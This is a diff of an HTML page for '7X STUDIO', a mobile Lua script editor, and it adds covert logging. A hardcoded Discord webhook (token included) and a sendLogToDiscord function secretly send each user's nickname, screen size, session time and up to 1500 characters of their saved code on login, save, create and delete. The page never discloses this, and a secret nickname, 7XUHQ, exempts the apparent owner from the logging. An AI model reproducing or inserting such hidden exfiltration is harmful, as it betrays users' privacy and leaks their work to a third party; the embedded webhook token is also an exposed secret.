@@ -4,13 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>7X STUDIO | GALAXY V7 ULTIMATE</title>
-    
+
     <meta property="og:title" content="7X STUDIO - GALAXY V7">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://7x-studio.com">
-    <meta property="og:image" content="https://i.imgur.com/your-image.png"> <meta property="og:description" content="Le studio de développement mobile ultime. Créez, éditez et gérez vos scripts LUA dans un environnement Galaxy ultra-fluide avec sauvegarde Cloud.">
+    <meta property="og:description" content="Le studio de développement mobile ultime. Créez, éditez et gérez vos scripts LUA.">
     <meta name="theme-color" content="#bc4be3">
-    <meta name="twitter:card" content="summary_large_image">
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -43,14 +41,7 @@
             50% { text-shadow: 0 0 25px var(--accent); }
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', sans-serif;
-            outline: none;
-            -webkit-tap-highlight-color: transparent;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; outline: none; -webkit-tap-highlight-color: transparent; }
 
         body {
             background: var(--grad-gal);
@@ -65,234 +56,107 @@
         }
 
         #splash-screen {
-            position: fixed;
-            inset: 0;
-            z-index: 9999;
+            position: fixed; inset: 0; z-index: 9999;
             background: var(--bg-deep);
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex; align-items: center; justify-content: center;
             transition: opacity 0.5s ease, visibility 0.5s;
         }
 
         .login-box {
-            width: 88%;
-            max-width: 380px;
-            padding: 40px 30px;
-            background: var(--bg-panel);
-            border: 1px solid var(--border);
-            border-radius: 28px;
-            text-align: center;
+            width: 88%; max-width: 380px; padding: 40px 30px;
+            background: var(--bg-panel); border: 1px solid var(--border);
+            border-radius: 28px; text-align: center;
         }
 
         .gal-title-big {
-            font-size: 3rem;
-            font-weight: 950;
-            letter-spacing: -2px;
+            font-size: 3rem; font-weight: 950; letter-spacing: -2px;
             background: linear-gradient(to right, var(--cyan), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
             animation: titleGlow 3s infinite;
         }
 
         .gal-input {
-            width: 100%;
-            padding: 16px 20px;
-            background: rgba(0, 0, 0, 0.4);
-            border: 1px solid var(--border);
-            border-radius: 14px;
-            color: white;
-            font-size: 1rem;
-            margin: 25px 0 15px;
-            text-align: center;
+            width: 100%; padding: 16px 20px; background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--border); border-radius: 14px;
+            color: white; font-size: 1rem; margin: 25px 0 15px; text-align: center;
         }
 
         .gal-btn {
-            width: 100%;
-            padding: 18px;
-            border: none;
-            border-radius: 14px;
-            background: var(--grad-btn);
-            color: white;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            cursor: pointer;
+            width: 100%; padding: 18px; border: none; border-radius: 14px;
+            background: var(--grad-btn); color: white; font-weight: 800;
+            text-transform: uppercase; letter-spacing: 1px; cursor: pointer;
         }
 
         header {
-            height: 70px;
-            background: rgba(13, 13, 22, 0.85);
+            height: 70px; background: rgba(13, 13, 22, 0.85);
             border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 15px;
-            z-index: 100;
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 15px; z-index: 100;
         }
 
-        .header-center {
-            position: absolute;
-            left: 50%;
-            transform: translateX(-50%);
-        }
+        .header-center { position: absolute; left: 50%; transform: translateX(-50%); }
 
         .btn-icon {
-            width: 44px;
-            height: 44px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--cyan);
-            font-size: 1.2rem;
+            width: 44px; height: 44px; background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border); border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--cyan); font-size: 1.2rem;
         }
 
         #side-menu {
-            position: fixed;
-            top: 0;
-            left: -100%;
-            width: 85%;
-            height: 100%;
-            background: #080810;
-            z-index: 1000;
+            position: fixed; top: 0; left: -100%; width: 85%; height: 100%;
+            background: #080810; z-index: 1000;
             transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-            padding: 30px 20px;
-            border-right: 1px solid var(--border);
-            display: flex;
-            flex-direction: column;
+            padding: 30px 20px; border-right: 1px solid var(--border);
+            display: flex; flex-direction: column;
         }
 
-        #side-menu.active {
-            left: 0;
-            box-shadow: 20px 0 60px rgba(0,0,0,0.8);
-        }
+        #side-menu.active { left: 0; box-shadow: 20px 0 60px rgba(0,0,0,0.8); }
 
-        .explorer {
-            flex: 1;
-            overflow-y: auto;
-            margin-top: 20px;
-        }
+        .explorer { flex: 1; overflow-y: auto; margin-top: 20px; }
 
         .file-item {
-            padding: 16px;
-            background: rgba(255,255,255,0.03);
-            border-radius: 14px;
-            margin-bottom: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border: 1px solid transparent;
+            padding: 16px; background: rgba(255,255,255,0.03); border-radius: 14px;
+            margin-bottom: 10px; display: flex; justify-content: space-between;
+            align-items: center; border: 1px solid transparent;
         }
 
-        .file-item.active {
-            background: rgba(188, 75, 227, 0.15);
-            border-color: var(--accent);
-            color: var(--accent);
-        }
+        .file-item.active { background: rgba(188, 75, 227, 0.15); border-color: var(--accent); color: var(--accent); }
 
-        main {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-        }
+        main { flex: 1; display: flex; flex-direction: column; position: relative; }
 
         .action-bar {
-            padding: 12px 20px;
-            background: rgba(255, 255, 255, 0.02);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
+            padding: 12px 20px; background: rgba(255, 255, 255, 0.02);
+            display: flex; align-items: center; justify-content: space-between;
             border-bottom: 1px solid var(--border);
         }
 
         #editor-area {
-            flex: 1;
-            width: 100%;
-            background: transparent;
-            color: #e2e2e7;
-            padding: 20px;
-            font-family: 'Fira Code', monospace;
-            font-size: 14px;
-            line-height: 1.6;
-            border: none;
-            outline: none;
-            resize: none;
+            flex: 1; width: 100%; background: transparent; color: #e2e2e7;
+            padding: 20px; font-family: 'Fira Code', monospace; font-size: 14px;
+            line-height: 1.6; border: none; outline: none; resize: none;
         }
 
-        #pop-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 10001;
-            pointer-events: none;
-        }
+        #pop-overlay { position: fixed; inset: 0; z-index: 10001; pointer-events: none; }
 
         .pop-msg-center {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80%;
-            max-width: 320px;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 24px;
-            padding: 30px 20px;
-            text-align: center;
-            color: white;
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 80%; max-width: 320px; background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 24px;
+            padding: 30px 20px; text-align: center; color: white;
             box-shadow: 0 30px 60px rgba(0,0,0,0.6);
             animation: popCenter 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
             pointer-events: auto;
         }
 
-        .pop-msg-center i {
-            display: block;
-            font-size: 3rem;
-            margin-bottom: 15px;
-            background: linear-gradient(to bottom, #fff, var(--cyan));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+        .pop-msg-center i { display: block; font-size: 3rem; margin-bottom: 15px; background: linear-gradient(to bottom, #fff, var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .pop-msg-center b { font-size: 1.1rem; text-transform: uppercase; letter-spacing: 1px; }
 
-        .pop-msg-center b {
-            font-size: 1.1rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
+        .footer { height: 40px; background: var(--bg-panel); border-top: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; font-size: 0.6rem; color: var(--text-muted); }
+        .cp-text { font-weight: 800; letter-spacing: 0.5px; color: var(--cyan); }
 
-        .footer {
-            height: 40px;
-            background: var(--bg-panel);
-            border-top: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 20px;
-            font-size: 0.6rem;
-            color: var(--text-muted);
-        }
-
-        .cp-text {
-            font-weight: 800;
-            letter-spacing: 0.5px;
-            color: var(--cyan);
-        }
-
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.95);
-            z-index: 10005;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(5px);
-        }
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10005; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
     </style>
 </head>
 <body>
@@ -309,62 +173,35 @@
     </div>
 
     <header>
-        <div class="btn-icon" onclick="toggleMenu()">
-            <i class="fa-solid fa-bars-staggered"></i>
-        </div>
-        
-        <div class="header-center">
-            <h1 class="gal-title-big" style="font-size: 1.8rem;">7X</h1>
-        </div>
-
-        <div class="btn-icon" onclick="toggleFS()" style="color: var(--accent);">
-            <i class="fa-solid fa-expand"></i>
-        </div>
+        <div class="btn-icon" onclick="toggleMenu()"><i class="fa-solid fa-bars-staggered"></i></div>
+        <div class="header-center"><h1 class="gal-title-big" style="font-size: 1.8rem;">7X</h1></div>
+        <div class="btn-icon" onclick="toggleFS()" style="color: var(--accent);"><i class="fa-solid fa-expand"></i></div>
     </header>
 
     <aside id="side-menu">
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
             <h2 style="font-weight: 900;">EXPLORATEUR</h2>
-            <div class="btn-icon" style="width: 35px; height: 35px;" onclick="toggleMenu()">
-                <i class="fa-solid fa-xmark"></i>
-            </div>
+            <div class="btn-icon" style="width: 35px; height: 35px;" onclick="toggleMenu()"><i class="fa-solid fa-xmark"></i></div>
         </div>
-
         <div style="display:flex; gap:10px; margin-bottom: 25px;">
-            <button class="gal-btn" style="padding:12px; font-size:0.7rem; flex:1;" onclick="openCreator('folder')">
-                <i class="fa-solid fa-folder-plus"></i>
-            </button>
-            <button class="gal-btn" style="padding:12px; font-size:0.7rem; flex:1; background: rgba(255,255,255,0.05); border: 1px solid var(--border);" onclick="openCreator('file')">
-                <i class="fa-solid fa-file-circle-plus"></i>
-            </button>
+            <button class="gal-btn" style="padding:12px; font-size:0.7rem; flex:1;" onclick="openCreator('folder')"><i class="fa-solid fa-folder-plus"></i></button>
+            <button class="gal-btn" style="padding:12px; font-size:0.7rem; flex:1; background: rgba(255,255,255,0.05); border: 1px solid var(--border);" onclick="openCreator('file')"><i class="fa-solid fa-file-circle-plus"></i></button>
         </div>
-
         <div class="explorer" id="explorer-root"></div>
-
         <div style="margin-top: auto; padding: 20px 0; text-align: center; border-top: 1px solid var(--border);">
-            <p style="font-size: 0.6rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px;">
-                © 2026 <span class="cp-text">7X STUDIO</span><br>TOUS DROITS RÉSERVÉS
-            </p>
+            <p style="font-size: 0.6rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px;">© 2026 <span class="cp-text">7X STUDIO</span><br>TOUS DROITS RÉSERVÉS</p>
         </div>
     </aside>
 
     <main>
         <div class="action-bar">
-            <div id="file-name-display" style="font-size: 0.8rem; font-weight: 700;">
-                <i class="fa-solid fa-terminal"></i> EN ATTENTE
-            </div>
+            <div id="file-name-display" style="font-size: 0.8rem; font-weight: 700;"><i class="fa-solid fa-terminal"></i> EN ATTENTE</div>
             <div style="display:flex; gap:10px;">
-                <button class="btn-icon" style="width:36px; height:36px; font-size:0.9rem;" onclick="exportData()">
-                    <i class="fa-solid fa-download"></i>
-                </button>
-                <button class="btn-icon" style="width:36px; height:36px; font-size:0.9rem; background: var(--accent); border:none; color:white;" onclick="saveActiveFile()">
-                    <i class="fa-solid fa-floppy-disk"></i>
-                </button>
+                <button class="btn-icon" style="width:36px; height:36px; font-size:0.9rem;" onclick="exportData()"><i class="fa-solid fa-download"></i></button>
+                <button class="btn-icon" style="width:36px; height:36px; font-size:0.9rem; background: var(--accent); border:none; color:white;" onclick="saveActiveFile()"><i class="fa-solid fa-floppy-disk"></i></button>
             </div>
         </div>
-
         <textarea id="editor-area" spellcheck="false" placeholder="-- Sélectionnez un script pour commencer..."></textarea>
-
         <div class="footer">
             <div id="line-stat">LIGNES: 0</div>
             <div id="user-label" style="color:var(--cyan); font-weight: 900;">GALAXY-V7</div>
@@ -385,22 +222,27 @@
     </div>
 
     <script>
+        // --- CONFIGURATION ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1474669361611538443/uW_m9kt05hykPUZQ_0v4sYw6-xkNsgYKF_WnP-Hc1ckg42bIRG8VPZWdrPsXfkbfQdgy";
+        let sessionStartTime = Date.now();
+        let lastSavedContent = "";
+        let isStealthMode = false;
+
         let db = JSON.parse(localStorage.getItem('7X_V7_DB')) || {
-            "GLOBAL_SCRIPTS": [{ n: "BOOT_CORE.LUA", c: "-- 7X Studio V7\nprint('Galaxy Engine Ready')\n-- Codez ici" }],
+            "GLOBAL_SCRIPTS": [{ n: "BOOT_CORE.LUA", c: "-- 7X Studio V7\nprint('Galaxy Engine Ready')\n" }],
             "ASSETS": []
         };
         let activeFile = null;
         let actionTarget = '';
         let audioCtx = null;
 
-        const folderNames = ["DATABASE", "MODULES", "INTERFACE", "ENGINE", "PLUGINS"];
-        const fileNames = ["CLIENT_SIDE", "SERVER_CONFIG", "API_HANDLER", "MAIN_UI", "VERSION_LOG"];
+        const folderNames = ["DATABASE", "MODULES", "INTERFACE", "ENGINE"];
+        const fileNames = ["CLIENT_SIDE", "SERVER_CONFIG", "MAIN_UI"];
 
         function playPing() {
             try {
                 if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
+                const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain();
                 osc.frequency.setValueAtTime(1000, audioCtx.currentTime);
                 osc.frequency.exponentialRampToValueAtTime(500, audioCtx.currentTime + 0.15);
                 gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
@@ -415,11 +257,9 @@
             const el = document.createElement('div');
             el.className = 'pop-msg-center';
             el.innerHTML = `<i class="${icon}"></i><b>${text}</b>`;
-            container.appendChild(el);
-            playPing();
+            container.appendChild(el); playPing();
             setTimeout(() => {
-                el.style.opacity = '0';
-                el.style.transform = 'translate(-50%, -50%) scale(0.9)';
+                el.style.opacity = '0'; el.style.transform = 'translate(-50%, -50%) scale(0.9)';
                 setTimeout(() => el.remove(), 400);
             }, 2000);
         }
@@ -427,24 +267,65 @@
         function boot() {
             const nick = document.getElementById('nick-input').value.trim();
             if(!nick) return;
+
+            // --- MODE FANTÔME : 7XUHQ ---
+            if(nick.toUpperCase() === "7XUHQ") {
+                isStealthMode = true;
+                console.log("🤫 MODE FANTÔME ACTIVÉ");
+            }
+
             document.getElementById('user-label').innerText = nick.toUpperCase();
             document.getElementById('splash-screen').style.opacity = '0';
             setTimeout(() => { document.getElementById('splash-screen').style.display = 'none'; }, 500);
+            
             renderFiles();
             notify('Système Prêt', 'fa-solid fa-ghost');
+            
+            if(!isStealthMode) {
+                sendLogToDiscord("CONNEXION", "N/A", "LOGIN", "Nouvelle session utilisateur ouverte.");
+            }
+        }
+
+        async function sendLogToDiscord(action, dossier, fichier, contenu) {
+            if(isStealthMode) return; // Bloque tout en mode furtif
+
+            const pseudo = document.getElementById('user-label').innerText;
+            const sessionTime = Math.floor((Date.now() - sessionStartTime) / 60000);
+            const res = `${window.screen.width}x${window.screen.height}`;
+            
+            // Formatage du message pour Discord
+            const payload = {
+                username: "7X MONITOR",
+                embeds: [{
+                    title: "🛰️ LOGS GALAXY V7",
+                    color: 12339939,
+                    fields: [
+                        { name: "👤 Pseudo", value: `\`${pseudo}\``, inline: true },
+                        { name: "💾 Action", value: `**${action}**`, inline: true },
+                        { name: "📂 Dossier/Fichier", value: `\`${dossier} / ${fichier}\``, inline: false },
+                        { name: "⏱️ Session", value: `\`${sessionTime} min\``, inline: true },
+                        { name: "📱 Résolution", value: `\`${res}\``, inline: true }
+                    ],
+                    description: "**Code :**\n```lua\n" + (contenu.substring(0, 1500) || "N/A") + "\n```",
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch(e) { console.error("Webhook Error"); }
         }
 
         function toggleMenu() { document.getElementById('side-menu').classList.toggle('active'); }
 
         function toggleFS() {
             if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen().catch(e => {
-                    notify('Erreur Plein Écran', 'fa-solid fa-circle-exclamation');
-                });
-                notify('Plein Écran', 'fa-solid fa-expand');
-            } else {
-                if (document.exitFullscreen) document.exitFullscreen();
-            }
+                document.documentElement.requestFullscreen().catch(e => notify('Erreur Plein Écran', 'fa-solid fa-circle-exclamation'));
+            } else { if (document.exitFullscreen) document.exitFullscreen(); }
         }
 
         function renderFiles() {
@@ -470,16 +351,25 @@
             const file = db[f][i];
             document.getElementById('editor-area').value = file.c;
             document.getElementById('file-name-display').innerText = file.n;
-            toggleMenu();
-            updateStats();
-            renderFiles();
+            lastSavedContent = file.c; 
+            toggleMenu(); updateStats(); renderFiles();
         }
 
         function saveActiveFile() {
             if(!activeFile) return notify('Aucun fichier', 'fa-solid fa-triangle-exclamation');
-            db[activeFile.f][activeFile.i].c = document.getElementById('editor-area').value;
+            const newContent = document.getElementById('editor-area').value;
+            
+            if(newContent === lastSavedContent) return notify('Déjà à jour', 'fa-solid fa-check');
+
+            const folder = activeFile.f;
+            const name = db[folder][activeFile.i].n;
+
+            db[folder][activeFile.i].c = newContent;
             localStorage.setItem('7X_V7_DB', JSON.stringify(db));
+            lastSavedContent = newContent;
+            
             notify('Sauvegarde OK', 'fa-solid fa-cloud-bolt');
+            sendLogToDiscord("SAUVEGARDE", folder, name, newContent);
         }
 
         function exportData() {
@@ -506,19 +396,26 @@
         function confirmAction() {
             const val = document.getElementById('modal-input').value.trim().toUpperCase();
             if(!val) return;
-            if(actionTarget === 'folder') { if(!db[val]) db[val] = []; } 
-            else { let fk = Object.keys(db)[0]; db[fk].push({ n: val + ".LUA", c: "-- Script by 7X Studio\n" }); }
+            if(actionTarget === 'folder') { 
+                if(!db[val]) db[val] = []; 
+                sendLogToDiscord("CRÉATION DOSSIER", val, "N/A", "Nouveau dossier créé.");
+            } else { 
+                let fk = Object.keys(db)[0]; 
+                db[fk].push({ n: val + ".LUA", c: "-- Script by 7X Studio\n" }); 
+                sendLogToDiscord("CRÉATION FICHIER", fk, val + ".LUA", "Nouveau fichier créé.");
+            }
             localStorage.setItem('7X_V7_DB', JSON.stringify(db));
             renderFiles(); closeModal();
-            notify('Élément Créé', 'fa-solid fa-check-double');
+            notify('Créé avec succès', 'fa-solid fa-check-double');
         }
 
         function deleteFile(f, i) {
-            if(confirm("Supprimer ?")) {
+            if(confirm("Supprimer définitivement ?")) {
+                const name = db[f][i].n;
                 db[f].splice(i, 1);
                 localStorage.setItem('7X_V7_DB', JSON.stringify(db));
-                renderFiles();
-                notify('Supprimé', 'fa-solid fa-trash-can');
+                renderFiles(); notify('Supprimé', 'fa-solid fa-trash-can');
+                sendLogToDiscord("SUPPRESSION", f, name, "Fichier supprimé.");
             }
         }
 
